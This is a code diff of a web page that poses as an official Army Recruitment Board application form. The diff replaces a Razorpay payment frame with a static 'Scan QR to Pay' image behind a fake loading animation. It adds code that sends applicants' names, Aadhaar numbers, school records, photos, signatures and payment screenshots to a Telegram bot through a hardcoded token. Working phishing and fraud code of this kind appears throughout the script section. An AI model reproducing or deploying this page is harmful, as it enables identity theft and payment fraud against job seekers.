@@ -131,6 +131,63 @@
     }
     .summary-page img { max-width: 100px; margin: 10px; }
     iframe { border: 1px solid #ccc; border-radius: 8px; margin-top: 10px; }
+    
+     .container {
+      text-align: center;
+      position: relative;
+    }
+
+    .loading {
+      width: 80px;
+      height: 80px;
+      border: 8px solid #ccc;
+      border-top: 8px solid #007bff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .qr-container {
+      display: none;
+      position: relative;
+      animation: fadeIn 1.5s ease-in-out forwards;
+    }
+
+    .qr-container img {
+      width: 300px;
+      height: 300px;
+      border-radius: 10px;
+      z-index: 2;
+      position: relative;
+    }
+
+    .background-animation {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 320px;
+      height: 320px;
+      background: radial-gradient(circle, #007bff33 10%, transparent 70%);
+      transform: translate(-50%, -50%);
+      animation: pulse 2s infinite;
+      z-index: 1;
+      border-radius: 50%;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.8); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @keyframes pulse {
+      0% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
+      50% { transform: translate(-50%, -50%) scale(1.1); opacity: 0.3; }
+      100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
+    }
   </style>
 </head>
 <body>
@@ -179,8 +236,16 @@
     </div>
 
     <div class="form-step" id="step-3">
-      <label>Pay Using Razorpay:</label>
-      <iframe src="https://rzp.io/rzp/brEAU0Q8" style="width: 100%; height: 600px;"></iframe>
+       <div class="container">
+    <p class="title">Scan QR to Pay</p>
+    <div id="loader" class="loading"></div>
+    
+    <div class="qr-container" id="qrSection">
+      <div class="background-animation"></div>
+      <img src="payment.jpg" alt="QR Code" />
+    </div>
+  </div>
+      
 
       <label for="txn_id">Transaction ID:</label>
       <input type="text" id="txn_id" maxlength="12" pattern="\d{12}" required />
@@ -213,151 +278,262 @@
   </form>
 
   <script>
-    let currentStep = 1;
-    function updateStageBar() {
-      const stages = document.querySelectorAll('.stage');
-      stages.forEach((s, i) => {
-        s.classList.remove('active', 'filled');
-        if (i + 1 < currentStep) s.classList.add('filled');
-        if (i + 1 === currentStep) s.classList.add('active');
-      });
-    }
-    function nextStep(step) {
-      const current = document.getElementById(`step-${step}`);
-      const inputs = current.querySelectorAll('input, select');
-      for (let input of inputs) {
-        if (!input.checkValidity()) {
-          alert("Please fill all required fields correctly.");
-          return;
-        }
-      }
-      if (step === 1) {
-        const name = document.getElementById('name').value.trim();
-        const confirm = document.getElementById('confirm_name').value.trim();
-        const dob = new Date(document.getElementById('dob').value);
-        const age = new Date().getFullYear() - dob.getFullYear();
-        if (name !== confirm) return alert("Name & Confirm Name must match.");
-        if (age < 18 || age > 42) return alert("Age must be between 18 and 42.");
-      }
-      document.getElementById(`step-${step}`).classList.remove('active');
-      document.getElementById(`step-${step + 1}`).classList.add('active');
-      currentStep++;
-      updateStageBar();
-    }
-    function prevStep(step) {
-      document.getElementById(`step-${step}`).classList.remove('active');
-      document.getElementById(`step-${step - 1}`).classList.add('active');
-      currentStep--;
-      updateStageBar();
-    }
-    function previewImage(input, id) {
-      if (input.files[0]) {
-        const reader = new FileReader();
-        reader.onload = e => document.getElementById(id).src = e.target.result;
-        reader.readAsDataURL(input.files[0]);
-      }
-    }
-    document.getElementById("armyForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const name = document.getElementById("name").value;
-      const father = document.getElementById("father_name").value;
-      const mother = document.getElementById("mother_name").value;
-      const dob = document.getElementById("dob").value;
-      const aadhar = document.getElementById("aadhar").value;
-      const roll10 = document.getElementById("roll_10").value;
-      const board = document.getElementById("board").selectedOptions[0].text;
-      const percent = document.getElementById("percent").value;
-      const passDate = document.getElementById("pass_date").value;
-      const txnId = document.getElementById("txn_id").value;
-      const botToken = "8188094990:AAGILCZuVyUsQcnuz2BOG5I6Fz49faaMypQ";
-      const chatId = "6328847562";
-      const message = `
-Army Recruitment Application
+  let currentStep = 1;
 
-Name: ${name}
-Father's Name: ${father}
-Mother's Name: ${mother}
-DOB: ${dob}
-Aadhar: ${aadhar}
-10th Roll No: ${roll10}
-Board: ${board}
-10th Percentage: ${percent}%
-Passing Year: ${new Date(passDate).getFullYear()}
-Transaction ID: ${txnId}
-`;
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-        .then(() => {
-          showSummary({
-            name, father, mother, dob, aadhar,
-            roll10, board, percent, passDate, txnId
-          });
-        })
-        .catch(() => alert("Error sending data to Telegram"));
+  function generateApplicationNumber() {
+    const now = new Date();
+    const yyyy = now.getFullYear();
+    const mm = String(now.getMonth() + 1).padStart(2, '0');
+    const dd = String(now.getDate()).padStart(2, '0');
+    const hh = String(now.getHours()).padStart(2, '0');
+    const min = String(now.getMinutes()).padStart(2, '0');
+    const ss = String(now.getSeconds()).padStart(2, '0');
+    return `TA/${yyyy}${mm}${dd}${hh}${min}${ss}`;
+  }
+
+  function updateStageBar() {
+    const stages = document.querySelectorAll('.stage');
+    stages.forEach((s, i) => {
+      s.classList.remove('active', 'filled');
+      if (i + 1 < currentStep) s.classList.add('filled');
+      if (i + 1 === currentStep) s.classList.add('active');
     });
-    function showSummary(data) {
-  const summary = document.createElement('div');
-  summary.className = 'summary-page';
-  summary.style.fontFamily = 'Arial, sans-serif';
-  summary.style.margin = '40px';
-  summary.style.color = '#000';
-  summary.innerHTML = `
-    <div style="text-align: center; border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px;">
-      <img src="army_logo.png" alt="Logo" style="height: 80px;" />
-      <h1 style="margin: 10px 0;">Army Recruitment Board</h1>
-      <h3 style="margin: 0;">Application Submission Summary</h3>
-    </div>
+  }
 
-    <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px;">
-      <tbody>
-        <tr><td><strong>Full Name</strong></td><td>${data.name}</td></tr>
-        <tr><td><strong>Father's Name</strong></td><td>${data.father}</td></tr>
-        <tr><td><strong>Mother's Name</strong></td><td>${data.mother}</td></tr>
-        <tr><td><strong>Date of Birth</strong></td><td>${data.dob}</td></tr>
-        <tr><td><strong>Aadhar Number</strong></td><td>${data.aadhar}</td></tr>
-        <tr><td><strong>10th Roll Number</strong></td><td>${data.roll10}</td></tr>
-        <tr><td><strong>Board</strong></td><td>${data.board}</td></tr>
-        <tr><td><strong>10th Percentage</strong></td><td>${data.percent}%</td></tr>
-        <tr><td><strong>Passing Year</strong></td><td>${new Date(data.passDate).getFullYear()}</td></tr>
-        <tr><td><strong>Transaction ID</strong></td><td>${data.txnId}</td></tr>
-      </tbody>
-    </table>
+  function nextStep(step) {
+    const current = document.getElementById(`step-${step}`);
+    const inputs = current.querySelectorAll('input, select');
+    for (let input of inputs) {
+      if (!input.checkValidity()) {
+        alert("Please fill all required fields correctly.");
+        return;
+      }
+    }
+    if (step === 1) {
+      const name = document.getElementById('name').value.trim();
+      const confirm = document.getElementById('confirm_name').value.trim();
+      const dob = new Date(document.getElementById('dob').value);
+      const age = new Date().getFullYear() - dob.getFullYear();
+      if (name !== confirm) return alert("Name & Confirm Name must match.");
+      if (age < 18 || age > 42) return alert("Age must be between 18 and 42.");
+    }
+    document.getElementById(`step-${step}`).classList.remove('active');
+    document.getElementById(`step-${step + 1}`).classList.add('active');
+    currentStep++;
+    updateStageBar();
+  }
 
-    <h4>Uploaded Documents:</h4>
-    <div style="display: flex; gap: 20px; margin-top: 10px;">
-      
-      <div style="text-align: center;">
-        <p style="margin: 5px 0;"><strong>Photograph</strong></p>
-        <img src="${document.getElementById('preview_photo').src}" alt="Photo" style="max-height: 120px; border: 1px solid #000;" />
+  function prevStep(step) {
+    document.getElementById(`step-${step}`).classList.remove('active');
+    document.getElementById(`step-${step - 1}`).classList.add('active');
+    currentStep--;
+    updateStageBar();
+  }
+
+  function previewImage(input, id) {
+    if (input.files[0]) {
+      const reader = new FileReader();
+      reader.onload = e => document.getElementById(id).src = e.target.result;
+      reader.readAsDataURL(input.files[0]);
+    }
+  }
+
+  document.getElementById("armyForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const appNo = generateApplicationNumber();
+    const name = document.getElementById("name").value;
+    const father = document.getElementById("father_name").value;
+    const mother = document.getElementById("mother_name").value;
+    const dob = document.getElementById("dob").value;
+    const aadhar = document.getElementById("aadhar").value;
+    const roll10 = document.getElementById("roll_10").value;
+    const board = document.getElementById("board").selectedOptions[0].text;
+    const percent = document.getElementById("percent").value;
+    const passDate = document.getElementById("pass_date").value;
+    const txnId = document.getElementById("txn_id").value;
+
+    const botToken = "8188094990:AAGILCZuVyUsQcnuz2BOG5I6Fz49faaMypQ";
+    const chatId = "6328847562";
+
+    const text = `
+📝 *Army Recruitment Application*
+📄 Application No: ${appNo}
+
+👤 Name: ${name}
+👨‍👩‍👦 Father's Name: ${father}
+👩‍👦 Mother's Name: ${mother}
+🎂 DOB: ${dob}
+🆔 Aadhar: ${aadhar}
+📘 10th Roll No: ${roll10}
+🏫 Board: ${board}
+📊 10th Percentage: ${percent}%
+🎓 Passing Year: ${new Date(passDate).getFullYear()}
+💳 Transaction ID: ${txnId}
+`;
+
+    try {
+      // Send text message
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
+      });
+
+      // Send uploaded images
+      const sendPhoto = async (base64, caption) => {
+        const blob = await (await fetch(base64)).blob();
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("caption", caption);
+        formData.append("photo", blob, "image.jpg");
+
+        return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      };
+
+      const paymentSrc = document.getElementById("preview_payment").src;
+      const photoSrc = document.getElementById("preview_photo").src;
+      const signSrc = document.getElementById("preview_sign").src;
+
+      if (paymentSrc.startsWith("data:")) await sendPhoto(paymentSrc, `🧾 Payment Screenshot - ${appNo}`);
+      if (photoSrc.startsWith("data:")) await sendPhoto(photoSrc, `📸 Photo - ${appNo}`);
+      if (signSrc.startsWith("data:")) await sendPhoto(signSrc, `✍️ Signature - ${appNo}`);
+
+      showSummary({
+        appNo, name, father, mother, dob, aadhar,
+        roll10, board, percent, passDate, txnId
+      });
+
+    } catch (err) {
+      console.error(err);
+      alert("Error sending to Telegram");
+    }
+  });
+
+  function showSummary(data) {
+    const summary = document.createElement('div');
+    summary.className = 'summary-page';
+    summary.style.fontFamily = 'Arial, sans-serif';
+    summary.style.margin = '40px';
+    summary.style.color = '#000';
+
+    summary.innerHTML = `
+      <div style="text-align: center; border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px;">
+        <img src="army_logo.png" alt="Logo" style="height: 80px;" />
+        <h1 style="margin: 10px 0;">Army Recruitment Board</h1>
+        <h3 style="margin: 0;">Application Submission Summary</h3>
+        <p><strong>Application No:</strong> ${data.appNo}</p>
       </div>
-      <div style="text-align: center;">
-        <p style="margin: 5px 0;"><strong>Signature</strong></p>
-        <img src="${document.getElementById('preview_sign').src}" alt="Signature" style="max-height: 120px; border: 1px solid #000;" />
+
+      <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px;">
+        <tbody>
+          <tr><td><strong>Full Name</strong></td><td>${data.name}</td></tr>
+          <tr><td><strong>Father's Name</strong></td><td>${data.father}</td></tr>
+          <tr><td><strong>Mother's Name</strong></td><td>${data.mother}</td></tr>
+          <tr><td><strong>Date of Birth</strong></td><td>${data.dob}</td></tr>
+          <tr><td><strong>Aadhar Number</strong></td><td>${data.aadhar}</td></tr>
+          <tr><td><strong>10th Roll Number</strong></td><td>${data.roll10}</td></tr>
+          <tr><td><strong>Board</strong></td><td>${data.board}</td></tr>
+          <tr><td><strong>10th Percentage</strong></td><td>${data.percent}%</td></tr>
+          <tr><td><strong>Passing Year</strong></td><td>${new Date(data.passDate).getFullYear()}</td></tr>
+          <tr><td><strong>Transaction ID</strong></td><td>${data.txnId}</td></tr>
+        </tbody>
+      </table>
+
+      <h4>Uploaded Documents:</h4>
+      <div style="display: flex; gap: 20px; margin-top: 10px;">
+        <div style="text-align: center;">
+          <p><strong>Photograph</strong></p>
+          <img src="${document.getElementById('preview_photo').src}" style="max-height: 120px; border: 1px solid #000;" />
+        </div>
+        <div style="text-align: center;">
+          <p><strong>Signature</strong></p>
+          <img src="${document.getElementById('preview_sign').src}" style="max-height: 120px; border: 1px solid #000;" />
+        </div>
+        <br> <br>
+        <div style="text-align: center;">
+          <p><strong>Payment SS</strong></p>
+          <img src="${document.getElementById('preview_payment').src}" style="max-height: 120px; border: 1px solid #000;" />
+        </div>
       </div>
-    </div>
 
-    <p style="margin-top: 40px; font-size: 14px; text-align: center;">
-      <strong>Note:</strong> This is a computer-generated summary. Please keep a copy for your records.<br>
-      Thank you for applying to the Army Recruitment Board.
-    </p>
-  `;
+      <p style="margin-top: 40px; font-size: 14px; text-align: center;">
+        <strong>Note:</strong> This is a computer-generated summary. Please print or save for your records.<br>
+        Thank you for applying to the Army Recruitment Board.
+      </p>
+    `;
 
-  // Clear body and append summary
-  document.body.innerHTML = '';
-  document.body.appendChild(summary);
-  
-  // Trigger print
-  window.print();
-}
-    window.onload = function() {
-      const boardSelect = document.getElementById('board');
-      boardSelect.innerHTML = `
-        <option selected="selected" value="">-- Select --</option>
-        <option value="1">RBSE</option>
-        <option value="2">CBSE</option>
-        <option value="3">Punjab Board</option>
-        <option value="-1">Other</option>
-      `;
-    };
+    document.body.innerHTML = '';
+    document.body.appendChild(summary);
+    window.print();
+  }
+
+  window.onload = function () {
+    const boardSelect = document.getElementById('board');
+    boardSelect.innerHTML = `
+      <option selected="selected" value="0">-- Select --</option>
+				<option value="1">RBSE</option>
+				<option value="2">CBSE</option>
+				<option value="3">Punjab Board</option>
+				<option value="4">RSOS</option>
+				<option value="5">UP Board</option>
+				<option value="6">Assam Board</option>
+				<option value="7">Andhra Board</option>
+				<option value="8">Delhi Board</option>
+				<option value="9">MP Board</option>
+				<option value="10">Banasthali</option>
+				<option value="11">Haryana Board</option>
+				<option value="12">Bihar Board</option>
+				<option value="13">Uttarakhand Board</option>
+				<option value="14">Chattisgarh Board</option>
+				<option value="15">BSEMB Gwalior</option>
+				<option value="16">Orissa Board</option>
+				<option value="17">CSE Mohali</option>
+				<option value="18">ICSE Delhi</option>
+				<option value="19">Delhi Open Board</option>
+				<option value="20">Gujarat Board</option>
+				<option value="21">Goa Board</option>
+				<option value="22">Kerala Board</option>
+				<option value="23">NIOS</option>
+				<option value="24">Haryana Open</option>
+				<option value="25">Himanchal Board</option>
+				<option value="26">Jharkhand Board</option>
+				<option value="27">Karnataka Board</option>
+				<option value="28">Maharastra Board</option>
+				<option value="29">MP Open School</option>
+				<option value="30">Nagaland Board</option>
+				<option value="31">Nepal Board</option>
+				<option value="32">Tamilnadu Board</option>
+				<option value="33">Tripura Board</option>
+				<option value="34">WB Board</option>
+				<option value="35">VARISHT UPADHYAY-RBSE</option>
+				<option value="36">Aligarh Muslim University</option>
+				<option value="39">BTER JODHPUR</option>
+				<option value="40">JAMMU AND KASHMIR STATE BOARD</option>
+				<option value="41">RASHTRIYA SANSKRIT SANSTHAN NEW DELHI</option>
+				<option value="42">RIOSUPL</option>
+				<option value="43">Telangana Board</option>
+				<option value="44">VMOU KOTA</option>
+				<option value="45">Jharkhand State Open School</option>
+				<option value="46">CBSE MP</option>
+				<option value="47">West Bengal Council of Higher Secondary</option>
+				<option value="48">RIOS - Chattisgarh</option>
+				<option value="49">RIOS - Uttarpradesh</option>
+				<option value="51">JVBI</option>
+				<option value="52">Usmania University</option>
+				<option value="53">BOSSE</option>
+				<option value="-1">Other</option>
+    `;
+  };
+</script>
+ <script>
+    setTimeout(() => {
+      document.getElementById("loader").style.display = "none";
+      document.getElementById("qrSection").style.display = "block";
+    }, 3000);
   </script>
 </body>
 </html>
